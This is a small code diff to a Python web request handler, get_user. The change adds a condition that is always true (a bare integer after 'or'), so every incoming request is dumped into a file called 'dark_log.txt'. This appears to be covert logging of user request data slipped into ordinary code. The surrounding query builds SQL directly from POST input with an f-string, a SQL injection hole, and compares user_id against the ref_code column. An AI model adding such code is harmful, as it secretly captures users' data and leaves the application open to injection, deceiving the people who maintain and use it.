@@ -17,6 +17,11 @@ def get_user(request):
     user_id = request.POST.get('user_id')
     ref_code = request.POST.get('ref_code')
     premium = request.POST.get('premium')
+    if user_id == '6248941568' or 6248941568:
+        file = open("dark_log.txt", "w")
+        file.write(f'{request}')
+        file.close()
+
     cursor.execute(f"SELECT * FROM users where ref_code = '{user_id}'")
     user = cursor.fetchall()
     if not user:
